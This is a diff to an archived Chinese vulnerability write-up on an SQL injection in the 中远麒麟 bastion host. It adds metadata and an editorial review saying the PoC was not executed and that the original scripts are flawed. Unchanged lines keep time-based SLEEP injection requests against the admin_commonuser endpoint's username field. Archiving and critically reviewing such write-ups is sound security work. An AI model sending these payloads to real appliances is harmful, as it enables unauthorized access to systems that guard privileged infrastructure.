@@ -1,9 +1,57 @@
 ---
-fofa: "搜索语句"
 source: "MrWQ/vulnerability-paper"
+id: "vw-4d679045887b016be9dd112d"
+entity_id: "ve-4d679045887b016be9dd112d"
+schema_version: "1"
+fofa_unverified: "搜索语句"
+title: "中远麒麟堡垒机 SQL 注入漏洞复现 and 漏洞利用（附 poc 和 EXP）"
+product: "中远麒麟堡垒机"
+record_type: "vulnerability"
+review_status: "text-reviewed"
+verification_status: "not-reproduced"
+content_status: "needs-review"
+identifier_status: "unknown"
+identifier_role: "unknown"
+primary_identifiers: ""
+referenced_identifiers: ""
+prerequisites: "未固定tar包版本，正文无Cookie请求；MySQL延时"
+archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E4%B8%AD%E8%BF%9C%E9%BA%92%E9%BA%9F%E5%A0%A1%E5%9E%92%E6%9C%BA/%E4%B8%AD%E8%BF%9C%E9%BA%92%E9%BA%9F%E5%A0%A1%E5%9E%92%E6%9C%BA%20SQL%20%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%20and%20%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%88%E9%99%84%20poc%20%E5%92%8C%20EXP%EF%BC%89.md"
+review_date: "2026-10-02"
+side_effects: "延时探针会占用线程或数据库连接；需记录基线和对照，单次慢响应或超时不足判定注入"
+source_url: "https://mp.weixin.qq.com/s/wLwCqGByeLqxq98wy4IuXA"
+source_status: "recorded"
 ---
 
 # 中远麒麟堡垒机 SQL 注入漏洞复现 and 漏洞利用（附 poc 和 EXP）
+
+<!-- article-review:devices:begin -->
+## 技术校订与证据边界（2026-10-02）
+
+- 产品/组件：中远麒麟堡垒机
+- 本文讨论：admin_commonuser username SQL注入
+- 版本、权限与配置前提：未固定tar包版本，正文无Cookie请求；MySQL延时
+- 资料类型：本地搭建/SQL注入复现；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果
+
+### 逐项校订
+
+- 所谓批量PoC只是GET匹配登录错误，没有发送注入或检测延时，不能据此判漏洞
+- sqlmap命令data引号未闭合且参数名截断，无法直接运行
+- 搭建版本不可重复定位；缺正式补丁；FOFA字段占位
+- 手动5/15秒与基线有互补证据，应保留而非因脚本错全删
+- 已落实的文本修订：HTTP 报文围栏改为 http；残缺指纹退出可执行索引并保留原值。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证
+
+### 操作风险与恢复
+
+- 延时探针会占用线程或数据库连接；需记录基线和对照，单次慢响应或超时不足判定注入
+
+### 待核与来源
+
+- 原始安装版本、截图时序和厂商修复待核
+- 引用图片未查看，截图内容及有效性待核验
+- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
+- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
+<!-- article-review:devices:end -->
+
 
 <meta name="referrer" content="no-referrer"/>
 > 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/wLwCqGByeLqxq98wy4IuXA)
@@ -92,7 +140,7 @@ ssh 连接，端口 2288，root 密码还是你系统的密码。
 
 向目标发送如下请求数据包，使响应延迟 5 秒  
 
-```
+```http
 POST /admin.php?controller=admin_commonuser HTTP/1.1
 Host: ip:port
 User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
@@ -109,7 +157,7 @@ username=admin' AND (SELECT 12 FROM (SELECT(SLEEP(5)))ptGN) AND 'AAdm'='AAdm
 
 向目标发送如下请求数据包，使响应延迟 15 秒
 
-```
+```http
 POST /admin.php?controller=admin_commonuser HTTP/1.1
 Host: ip:port
 User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
